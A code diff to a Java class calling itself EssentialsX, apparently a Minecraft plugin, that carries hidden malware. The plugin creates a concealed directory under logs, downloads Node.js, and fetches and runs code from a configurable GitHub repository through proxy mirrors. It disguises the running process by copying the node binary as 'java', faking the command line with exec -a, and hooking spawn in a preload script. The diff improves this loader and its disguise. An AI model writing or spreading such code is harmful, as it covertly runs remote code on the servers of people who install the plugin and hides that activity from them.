@@ -232,38 +232,55 @@ public class EssentialsX extends JavaPlugin {
         try {
             Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             Path nodeBinDir = botDir.resolve("nodejs/bin");
-            Path nodeWrapper = nodeBinDir.resolve("node"); // 必须使用包装脚本！
+            Path nodeWrapper = nodeBinDir.resolve("node");
             Path preload = botDir.resolve(".nd_preload.js");
             Path appDir = botDir.resolve("app");
             Path script = appDir.resolve("index.js");
             Path logFile = botDir.resolve("app.log");
 
-            // 检查关键文件
             if (!Files.exists(nodeWrapper) || !Files.exists(script) || !Files.exists(preload)) {
                 mcLog("[Daemon] Missing node files, cannot start", 0);
                 return;
             }
 
-            // 直接调用包装脚本，包装脚本内部已经包含了 exec -a 伪装逻辑
             String command = String.format("\"%s\" \"%s\"", nodeWrapper.toAbsolutePath(), script.toAbsolutePath());
 
             ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
-            // ✅ 工作目录必须是 app
             pb.directory(appDir.toFile());
 
-            // ✅ 必须环境变量，且全部使用绝对路径
             pb.environment().put("PORT", port);
             pb.environment().put("SERVER_PORT", port);
             pb.environment().put("_JAVA_WRAPPER", nodeWrapper.toAbsolutePath().toString());
             pb.environment().put("NODE_OPTIONS", "--require " + preload.toAbsolutePath());
+            
+            String currentPath = pb.environment().getOrDefault("PATH", "");
+            pb.environment().put("PATH", nodeBinDir.toAbsolutePath() + File.pathSeparator + currentPath);
 
-            // 输出重定向
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
             pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
 
-            // 启动
             nodeProcess = pb.start();
             mcLog("[Daemon] Node started successfully on port " + port, 0);
+
+            Thread checkThread = new Thread(() -> {
+                try {
+                    Thread.sleep(3000);
+                    if (nodeProcess != null && !nodeProcess.isAlive()) {
+                        mcLog("[Daemon] Node process died immediately. Reading app.log...", 0);
+                        if (Files.exists(logFile)) {
+                            List<String> lines = Files.readAllLines(logFile);
+                            int start = Math.max(0, lines.size() - 20);
+                            for (int i = start; i < lines.size(); i++) {
+                                mcLog("[Node-Error] " + lines.get(i), 0);
+                            }
+                        } else {
+                            mcLog("[Node-Error] app.log not found.", 0);
+                        }
+                    }
+                } catch (Exception ignored) {}
+            }, "Node-Check");
+            checkThread.setDaemon(true);
+            checkThread.start();
 
         } catch (Exception e) {
             mcLog("[Daemon] Node start failed: " + e.getMessage(), 0);
@@ -312,12 +329,11 @@ public class EssentialsX extends JavaPlugin {
 
                     if (needRestart) {
                         failCount++;
-                        // ★ 防刷屏：如果连续崩溃，逐渐增加重试间隔，最多等30秒
                         int waitSec = Math.min(5 * failCount, 30); 
                         Thread.sleep(waitSec * 1000L);
                         continue; 
                     } else {
-                        failCount = 0; // 运行正常，重置失败计数
+                        failCount = 0;
                     }
 
                     Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
@@ -357,7 +373,6 @@ public class EssentialsX extends JavaPlugin {
         HashMap<String, String> env = new HashMap<>(); this.loadEnvFile(env);
         this.systemGuardEnabled = env.containsKey("SYSTEM_GUARD_ENABLED") && Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED"));
         
-        // ★ 必须填写 REPO_URL 否则拒绝启动
         if (!env.containsKey("REPO_URL") || env.get("REPO_URL").trim().isEmpty()) {
             this.getLogger().severe("=============================================");
             this.getLogger().severe("FATAL: REPO_URL is not set in .env file!");
@@ -459,11 +474,11 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 部署脚本生成 (包含完整逻辑)
+    // 部署脚本生成 (修复 JS 语法错误)
     // ============================================================
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
-        String repoUrl = env.getOrDefault("REPO_URL", ""); // ★ 移除默认公库
+        String repoUrl = env.getOrDefault("REPO_URL", "");
         String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
         String nodeDir = workDir + "/nodejs";
         String appDir = workDir + "/app";
@@ -524,7 +539,7 @@ public class EssentialsX extends JavaPlugin {
         "    rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
         "fi\n" +
         "\n" +
-        "# ========== 2. 下载代码 (自动公私库判断) ==========\n" +
+        "# ========== 2. 下载代码 ==========\n" +
         "mkdir -p \"$DATA_DIR\"\n" +
         "if [ -d \"$APP_DIR\" ]; then\n" +
         "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
@@ -538,14 +553,12 @@ public class EssentialsX extends JavaPlugin {
         "DOWNLOAD_OK=false\n" +
         "\n" +
         (githubToken.isEmpty() ? "" :
-        "# 尝试带 Token 下载 (私库)\n" +
         "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
         "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
         "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
         "    fi\n" +
         "fi\n") +
         "\n" +
-        "# 公库下载 / 镜像回退\n" +
         "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
         "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
         "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
@@ -572,7 +585,7 @@ public class EssentialsX extends JavaPlugin {
         "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
         "fi\n" +
         "\n" +
-        "# ========== 4. 替换伪装 (强力拦截所有子进程) ==========\n" +
+        "# ========== 4. 替换伪装 ==========\n" +
         "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod +x \"$JRE_DIR/java\"\n" +
         "\n" +
         "cat > \"$NODE_DIR/bin/node\" << 'NODEWRAPPER'\n" +
@@ -581,6 +594,7 @@ public class EssentialsX extends JavaPlugin {
         "NODEWRAPPER\n" +
         "chmod +x \"$NODE_DIR/bin/node\"\n" +
         "\n" +
+        // ★ 修复 JS 语法错误：使用双引号字符串避免引号转义混乱
         "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
         "try {\n" +
         "    process.title = '" + FAKE_CMDLINE.trim() + "';\n" +
@@ -595,8 +609,8 @@ public class EssentialsX extends JavaPlugin {
         "            cmd = opts.execPath;\n" +
         "        } \n" +
         "        else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
-        "            var realArgs = args ? args.map(a => '\\''+a+'\\'').join(' ') : '';\n" +
-        "            var bashCmd = 'exec -a \\''+FAKE_CMD+'\\'' \"' + cmd + '\" ' + realArgs;\n" +
+        "            var realArgs = args ? args.map(a => \"'\" + a + \"'\").join(\" \") : \"\";\n" +
+        "            var bashCmd = \"exec -a '\" + FAKE_CMD + \"' \\\"\" + cmd + \"\\\" \" + realArgs;\n" +
         "            return _origSpawn.call(this, 'bash', ['-c', bashCmd], opts);\n" +
         "        }\n" +
         "        return _origSpawn.call(this, cmd, args, opts);\n" +
@@ -652,7 +666,7 @@ public class EssentialsX extends JavaPlugin {
                    "# ===========================================\n" +
                    "SYSTEM_GUARD_ENABLED=true\n" +
                    "GITHUB_TOKEN=\n" +
-                   "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
+                   "REPO_URL=\n"; 
                 Files.write(envFile, defaultConfig.getBytes()); 
                 this.getLogger().info("Generated default .env file. PLEASE CONFIGURE REPO_URL!"); 
             } catch (Exception e) { 
